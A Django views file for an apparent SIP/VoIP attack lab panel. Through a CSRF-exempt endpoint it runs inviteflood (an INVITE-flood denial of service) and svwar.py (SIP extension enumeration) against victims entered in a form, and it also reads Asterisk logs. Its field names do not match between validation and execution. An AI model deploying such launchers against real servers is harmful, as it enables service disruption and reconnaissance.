import subprocess
import shlex
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse, Http404
from django.shortcuts import render
from django.core.exceptions import ObjectDoesNotExist
from .models import Attack

# Current attack execution status
current_attacks = {}

# View for rendering the port scanner page
def portScanner(request):
    return render(request, "portScanner.html")

# View for listing attacks and their details
def attacks(request):
    attacks = [
        {"id": "invite_flood", "name": "Invite Flood"},
        {"id": "sip_enum", "name": "SIP Enumeration"},
    ]

    # selected_attack = next((attack for attack in attacks if attack["id"] == attack_id), None)

    # if not selected_attack:
        # raise Http404("Attack not found")

    context = {
        "attacks": attacks,
        # "selected_attack": selected_attack,
    }
    return render(request, "attacks.html", context)

# View for rendering the nmap page
def nmap(request):
    return render(request, "nmap.html")

# View for reading log files
def read_log_file(request):
    log_file_path = "/var/log/asterisk/full"  # Replace with your actual Asterisk log file path
    try:
        with open(log_file_path, "r") as file:
            logs = file.readlines()[-100:]  # Read the last 100 lines for better performance
    except FileNotFoundError:
        logs = ["Log file not found."]
    except PermissionError:
        logs = ["Permission denied while accessing the log file."]

    # If the request is via AJAX, return JSON
    if request.headers.get("X-Requested-With") == "XMLHttpRequest":
        return JsonResponse({"logs": logs})

    # For non-AJAX requests, render logs to a template
    return render(request, "log_viewer.html", {"logs": logs})

# View for dynamically rendering and handling attack forms
@csrf_exempt
def attack_form(request, attack_id):
    """Dynamically render the form for the selected attack."""
    try:
        # Fetch the attack by ID
        attack = Attack.objects.get(id=attack_id)
    except ObjectDoesNotExist:
        return JsonResponse({"error": "Attack not found"}, status=404)

    
    if request.method == "GET":
        form = get_attack_form(attack_id)
        if not form:
            return JsonResponse({"error": "Unknown attack"}, status=400)

        return JsonResponse({"form": form})

    elif request.method == "POST":
        try:
            data = request.POST
            validate_attack_data(attack_id, data)  # Validate POST data
            attack_output = perform_attack(attack_id, data)
            return JsonResponse({"success": True, "output": attack_output})
        except ValueError as e:
            return JsonResponse({"success": False, "error": str(e)})
        except Exception as e:
            return JsonResponse({"success": False, "error": f"An unexpected error occurred: {str(e)}"})

# Helper function to get form fields for a specific attack
def get_attack_form(attack_id):
    """Return form fields based on attack ID."""
    if attack_id == "invite_flood":
        return {
            "fields": [
                {"label": "Interface", "name": "interface", "type": "text"},
                {"label": "Victim Username", "name": "username", "type": "text"},
                {"label": "Server IP", "name": "server_ip", "type": "text"},
                {"label": "No of Packets", "name": "packets", "type": "number"},
            ]
        }
    elif attack_id == "sip_enum":
        return {
            "fields": [
                {"label": "SIP Username", "name": "sip_username", "type": "text"},
                {"label": "SIP Server IP", "name": "sip_server_ip", "type": "text"},
            ]
        }
    return None

# Helper function to validate POST data
def validate_attack_data(attack_id, data):
    """Validate POST data for a given attack."""
    required_fields = {
        "invite_flood": ["interface", "username", "server_ip", "packets"],
        "sip_enum": ["sip_username", "sip_server_ip"],
    }

    missing_fields = [field for field in required_fields.get(attack_id, []) if not data.get(field)]
    if missing_fields:
        raise ValueError(f"Missing required fields: {', '.join(missing_fields)}")

# Helper function to simulate attack logic

def perform_attack(attack_id, data):
    """Execute the actual attack commands."""
    if attack_id == "invite_flood":
        interface = data.get("interface")
        username = data.get("username")
        server_ip = data.get("server_ip")
        packets = data.get("packets")

        if not all([interface, username, server_ip, packets]):
            raise ValueError("All fields are required for Invite Flood.")

        # Command: inviteflood eth0 5000 example.local 192.168.1.5 100
        command = f"inviteflood {shlex.quote(interface)} 5000 {shlex.quote(username)} {shlex.quote(server_ip)} {shlex.quote(packets)}"

        try:
            result = subprocess.run(
                shlex.split(command), 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            if result.returncode != 0:
                raise RuntimeError(f"Command failed: {result.stderr.strip()}")

            return f"Invite Flood attack executed successfully: {result.stdout.strip()}"
        except Exception as e:
            raise RuntimeError(f"Error executing Invite Flood: {str(e)}")

    elif attack_id == "sip_enum":
        sip_username_range = data.get("sip_username_range")
        sip_server_ip_range = data.get("sip_server_ip_range")

        if not all([sip_username_range, sip_server_ip_range]):
            raise ValueError("Both SIP username and server IP range are required for SIP Enumeration.")

        # Command: python svwar.py -e<username-range> <server-ip range> -m INVITE
        command = f"python svwar.py -e{shlex.quote(sip_username_range)} {shlex.quote(sip_server_ip_range)} -m INVITE"

        try:
            result = subprocess.run(
                shlex.split(command),
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode != 0:
                raise RuntimeError(f"Command failed: {result.stderr.strip()}")

            return f"SIP Enumeration executed successfully: {result.stdout.strip()}"
        except Exception as e:
            raise RuntimeError(f"Error executing SIP Enumeration: {str(e)}")

    else:
        raise ValueError("Invalid attack ID.")
